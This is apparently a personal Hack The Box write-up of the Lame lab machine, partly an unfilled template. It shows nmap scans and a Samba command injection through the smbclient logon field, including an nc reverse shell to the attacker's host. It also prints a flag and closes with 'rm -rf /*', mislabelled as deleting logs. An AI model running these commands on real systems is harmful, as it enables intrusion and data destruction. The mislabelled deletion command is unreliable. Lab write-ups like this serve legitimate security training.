### Hack The Box Writeup: Lame

## Overview

- **Machine Name**: Lame
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: May 2025

Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. 

## Tools Used

- **Enumeration**: nmap
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
# Ping machine to see if thus one is power up
ping -c 1 10.10.10.3

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.10.3 -oG allPorts
nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted

```

### Exploitation
```bash
# Wtih the version of the ftp system we can search vulnerabilities in serachsploit
   6   │ 21/tcp   open  ftp         vsftpd 2.3.4
   7   │ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
   8   │ | ftp-syst: 
   9   │ |   STAT: 
  10   │ | FTP server status

searchsploit -x unix/remote/49757.py # to see file
searchsploit -m unix/remote/49757.py # to move file to current directory

mv 49757.py ftp_exploit.py
# Its a rabbit hole! We need to search another way to vuln

searchsploit Samba 3.0.20

smbclient -L 10.10.10.3
smblcient //10.10.10.3/tmp

# In smb
smb: \> logon "/=`nohup ping -c 1 10.10.15.66`"

# Ooen a tcmpdump in current machie to view tcmp traces
tcpdump -i tun0 icmp -n

# ans
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:22:46.174492 IP 10.10.10.3 > 10.10.15.66: ICMP echo request, id 8985, seq 1, length 64
13:22:46.174570 IP 10.10.15.66 > 10.10.10.3: ICMP echo reply, id 8985, seq 1, length 64

# We can do RCE

smb: \> logon "/=`nohup whoami | nc 10.10.15.66 443`"
nc -nlvp 443 # localmachine

# ans
root

# Send a bash to local machine
smb: \> logon "/=`nohup nc -e /bin/bash 10.10.15.66 443`"
nc -nlvp 443
```

\[Describe the outcome, e.g., initial shell access, user-level credentials.\]

### Privilege Escalation

```bash
# STTY config

cd /home
cd makis
cat user.txt
# 01ab948279f1341d221facee0ca74d53

cd /root
cat root.txt

find \-name usert.txt

cd /
(rm -rf /*) 2>/dev/null # deelte all logs
```

\[Describe the final access achieved, e.g., root shell, admin credentials.\]

## Challenges Faced

\[List specific challenges encountered, e.g., difficulty identifying the correct exploit, dealing with restricted shells.\]

- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by edibauer, \[05 2025\]. Feedback welcome at \[github.com/ediedi\].*